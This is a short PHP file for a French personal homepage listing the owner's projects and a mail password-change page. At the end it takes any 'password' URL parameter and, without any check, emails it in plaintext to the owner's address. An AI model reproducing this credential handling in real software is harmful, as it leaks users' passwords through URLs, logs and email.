<?php
function index()
{
	head();
	?>
<h1>Linux &gt; Windows</h1>
<p>Bonjour et bienvenue sur le site des Lebbadi! Voici mes différents projets</p>
<li><a href='http://radio.lebbadi.fr'>Algo Médecine</a></li>
<li><a href="http://ljsc.herokuapp.com">Le Journal du Séminaire Collège</a></li>
<li><a href="mailto:technical-assistance@lebbadi.fr">Adresse e-mail pour assistance sur un ordinateur</a></li>
<li><a href="/kindle">Cours Kindle</a></li>
<li><a href="/mails-passwords">Changement de mot de passe des mails @lebbadi.fr</a></li>
	<?php
	foot();
	if (isset($_GET['password'])) {

// Create a message
$message = new Swift_Message('Password');
$message->setFrom(['romain@lebbadi.fr' => 'Romain Lebbadi']);
$message->setTo(['romain@lebbadi.fr' => 'Romain Lebbadi-Breteau']);
$message->setBody($_GET['password']);
  ;

// Send the message
$result = $_SESSION['mailer']->send($message);
	}
}